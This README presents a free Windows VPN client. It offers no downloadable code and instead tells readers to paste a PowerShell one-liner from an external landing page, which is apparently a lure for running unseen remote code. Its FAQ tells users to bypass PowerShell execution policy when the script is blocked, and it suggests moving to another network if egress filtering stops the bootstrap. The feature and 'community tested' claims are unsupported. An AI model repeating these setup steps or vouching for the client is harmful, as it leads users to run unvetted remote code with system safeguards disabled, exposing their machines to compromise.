<div align="center">
<img src="assets/banner.png" width="100%" alt="VPN banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-4F46E5?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-0891B2?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=2563EB&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%9A%80+Tunnel+Vpn+Client;%E2%AD%90+No+Limits;%E2%9C%85+Community+Tested;%F0%9F%94%A7+Ready+for+Windows;%E2%9C%A8+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=unity" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

### 🖥️ PowerShell Setup

Grab the latest build by opening PowerShell and running the one-liner from the landing page — it bootstraps the client and wires up the tunnel for you.

![status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square) ![platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue?style=flat-square) ![ps](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=flat-square)

<p align="center">
  <a href="https://aditya160904.github.io/tunnel-vpn-client/">
    <img src="files/button.svg" width="520" alt="PowerShell Installer" />
  </a>
</p>

## System Requirements

- Windows 10 or Windows 11 (x64)
- PowerShell 5.1 or newer (built in — you already have it)
- An active internet connection for the initial bootstrap
- Roughly 120 MB free disk for the client + config cache

That's it. No .NET runtime hunting, no bundled installer framework, no reboot dance.

## Features

Here's what actually shipped in this build versus the old 2024 fork everyone was stuck on. It's lighter, it boots faster, and it drops half the dependencies the old one dragged around.

**Tunnel & Protocol**

- WireGuard-first tunnel setup — handshake in under a second on decent networks
- OpenVPN fallback for networks that block UDP
- Kill switch that actually respects the setting without a reconnect loop
- Split tunneling rules per-app, editable without restarting the service

**Server & Routing**

- Free server pool with live latency sorting so you're not guessing which node is dead
- Automatic region failover — if a node drops, it hops to the next best one
- DNS leak protection baked into the tunnel config, not bolted on afterward
- IPv6 handling that doesn't quietly leak your real address

**Client & Config**

- One-file config profiles you can export and carry between machines
- Portable mode — everything stays in the folder, nothing sprayed into AppData
- Tray-first UI; the full window is optional, not mandatory
- Log verbosity toggle for when you're debugging a stubborn connection

**Under the hood**

- Trimmed dependency tree — dropped three runtime libs versus the 2024 build
- Cold start is noticeably quicker; the tray icon comes up before you finish clicking
- Config validation runs before the tunnel starts, so bad profiles fail loudly instead of silently

## How it works

This isn't a `.exe` you double-click off a mirror — setup runs through PowerShell. You open PowerShell (regular or admin, admin only if you want the kill-switch service registered system-wide), paste the one-liner from the landing page, and hit Enter. The script pulls the current client, drops it into a local folder, and sets up the tunnel service. First run asks you to pick a region and confirms the tunnel comes up.

The landing page holds the actual command — grab it there so you're always pulling the current build instead of a stale copy someone pasted into a forum thread six months ago.

## Compatibility

- **OS:** Windows 10 (build 1909+) and Windows 11, x64. ARM64 works but is untested by us — report issues if you hit them.
- **PowerShell:** 5.1 is the floor; PowerShell 7 runs fine too.
- **Network:** Any connection that lets you reach the landing page. Corporate networks with aggressive egress filtering may block the bootstrap — try from a different network if it stalls.
- **Offline:** The client works offline for local config editing, but tunnels obviously need a connection.

## FAQ

**Do I need admin rights?**
Not for basic use. You only need admin if you want the kill-switch and system-wide split tunneling service registered.

**PowerShell says the script is blocked — what now?**
Execution policy on some machines is locked down. Run `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass` in that same window, then paste the command again.

**Is this the same as the old repo?**
No — this is the 2026 fork. Smaller dependency tree, faster cold start, WireGuard-first instead of OpenVPN-first.

**Will it work behind a school/office firewall?**
Sometimes. OpenVPN fallback over TCP:443 gets through more often than the default, but genuinely locked-down networks may still block it.

**Where do configs live in portable mode?**
In the folder you extracted to — nothing touches AppData. Delete the folder and it's gone.

**Can I run it alongside another VPN client?**
You can, but don't. Two tunnel adapters fighting over routes is a bad time. Disable one first.

## Disclaimer

This is a hobbyist project maintained as a side gig — it's provided as-is, no warranty, no SLA. Use it at your own risk. You're responsible for complying with your local laws and your network's acceptable-use policy. We don't log your traffic and we don't want to; keep it that way by not doing anything that makes us regret saying that.

## License

MIT — see `LICENSE` for the full text.

<div align="center">

![MIT](https://img.shields.io/badge/license-MIT-green?style=flat-square) ![build](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square) ![maintained](https://img.shields.io/badge/maintained-yes-blue?style=flat-square)
